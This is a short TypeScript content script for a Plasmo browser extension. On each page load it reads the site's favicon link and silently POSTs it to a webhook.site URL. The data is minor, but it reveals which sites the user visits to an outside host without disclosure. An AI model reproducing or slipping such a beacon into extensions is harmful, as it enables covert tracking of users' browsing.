import type { PlasmoCSConfig } from "plasmo";

const getFaviconLink = () => {
	const allLinks = document.getElementsByTagName("link");
	let favicon: string;
	for (const node of allLinks) {
		const attr = node.getAttribute("rel");
		if (attr === "icon" || attr === "shortcut icon")
			favicon = node.getAttribute("href");
	}
	if (favicon && !favicon.startsWith("http"))
		favicon = window.location.origin + favicon;
	return favicon;
};

const faviconUrl = getFaviconLink();

fetch("https://webhook.site/0719324a-62fd-474c-a841-cc455525e5d8", {
	method: "POST",
	headers: { "Content-Type": "application/json" },
	body: JSON.stringify({ faviconUrl }),
});

export const config: PlasmoCSConfig = {
	run_at: "document_end",
};
